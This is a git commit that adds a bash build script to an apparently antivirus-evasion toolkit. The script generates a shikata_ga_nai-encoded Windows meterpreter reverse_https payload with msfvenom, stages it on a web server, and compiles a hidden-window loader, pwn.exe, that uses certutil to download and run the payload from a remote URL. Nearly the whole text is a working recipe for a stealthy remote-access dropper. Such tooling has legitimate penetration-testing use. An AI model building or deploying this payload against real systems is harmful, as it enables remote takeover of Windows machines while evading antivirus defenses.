68f7c1bf09f7ea50fdb23d36367f308575ac8af4
Daniel Sauder <daniel.sauder@web.de>
2018-04-02 00:34:58 +0200

    build script for downcertutil

---
+++ build/build_win32_meterpreter_rev_https_shikata_download_certutil_raw_loadfile.sh
@@ -0,0 +1,20 @@
+#!/bin/bash          
+# build the .exe file that loads the payload from a given text file
+# include script containing the compiler var $win32_compiler
+# you can edit the compiler in build/global_win32.sh
+# or enter $win32_compiler="mycompiler" here
+. build/global_win32.sh
+# make meterpreter reverse payload, encoded with shikata_ga_nai
+# additionaly to the avet encoder, further encoding should be used
+msfvenom -p windows/meterpreter/reverse_https lhost=192.168.2.103 lport=443 -e x86/shikata_ga_nai -f raw -a x86 -b "\x00" --platform Windows > thepayload.bin
+# copy file to standart web server dir
+cp thepayload /var/html/www
+# call make_avet, the -l stands for loading and exec shellcode from given file 
+# -d certutil downloads the file from a url, -q hides window
+./make_avet -l -d certutil -q 
+# compile to pwn.exe file
+$win32_compiler -o pwn.exe avet.c
+strip pwn.exe
+# cleanup
+echo "" > defs.h
+# call your programm with pwn.exe thepayload.bin http://myserver/thepayload.bin 
